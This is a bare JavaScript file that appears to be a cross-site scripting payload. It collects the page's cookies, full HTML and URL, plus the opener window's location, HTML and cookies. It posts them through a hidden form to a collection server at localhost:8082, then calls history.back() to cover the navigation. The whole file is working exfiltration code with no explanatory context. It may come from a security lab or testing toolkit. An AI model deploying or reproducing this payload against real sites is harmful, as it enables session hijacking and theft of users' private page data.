(function() {
    if (window.name !== '__') {

        try {
            dcoo = document.cookie
        } catch (e) {
            dcoo = null
        }

        try {
            inne = document.body.parentNode.innerHTML
        } catch (e) {
            inne = null
        }
        try {
            durl = document.URL
        } catch (e) {
            durl = null
        }
        try {
            oloc = opener.location
        } catch (e) {
            oloc = null
        }
        try {
            oloh = opener.document.body.innerHTML
        } catch (e) {
            oloh = null
        }
        try {
            odoc = opener.document.cookie
        } catch (e) {
            odoc = null
        }

        var iframe = document.createElementNS('http://www.w3.org/1999/xhtml', 'iframe');
        iframe.setAttribute('style', 'display:none');
        iframe.setAttribute('name', 'hidden-form');
        
        var form = document.createElementNS('http://www.w3.org/1999/xhtml', 'form');
        form.setAttribute('target', 'hidden-form');

        var c = document.createElementNS('http://www.w3.org/1999/xhtml', 'input');
        var i = document.createElementNS('http://www.w3.org/1999/xhtml', 'input');
        var l = document.createElementNS('http://www.w3.org/1999/xhtml', 'input');
        var ol = document.createElementNS('http://www.w3.org/1999/xhtml', 'input');
        var oi = document.createElementNS('http://www.w3.org/1999/xhtml', 'input');
        var oc = document.createElementNS('http://www.w3.org/1999/xhtml', 'input');
        
        c.setAttribute('value', escape(dcoo));
        i.setAttribute('value', escape(inne));
        l.setAttribute('value', escape(durl));
        ol.setAttribute('value', escape(oloc));
        oi.setAttribute('value', escape(oloh));
        oc.setAttribute('value', escape(odoc));
        
        c.setAttribute('name', 'dcoo');
        i.setAttribute('name', 'inne');
        l.setAttribute('name', 'durl');
        ol.setAttribute('name', 'oloc');
        oi.setAttribute('name', 'oloh');
        oc.setAttribute('name', 'odoc');

        form.appendChild(c);
        form.appendChild(i);
        form.appendChild(l);
        form.appendChild(oi);
        form.appendChild(ol);
        form.appendChild(oc);

        var body = document.getElementsByTagName('body')[0];

        form.action = 'http://localhost:8082/m';
        form.method = 'post';
        form.target = '_blank';

        body.appendChild(form);
        window.name = '__';
        form.submit();
        history.back();
    } else {
        window.name = ''
    }
})();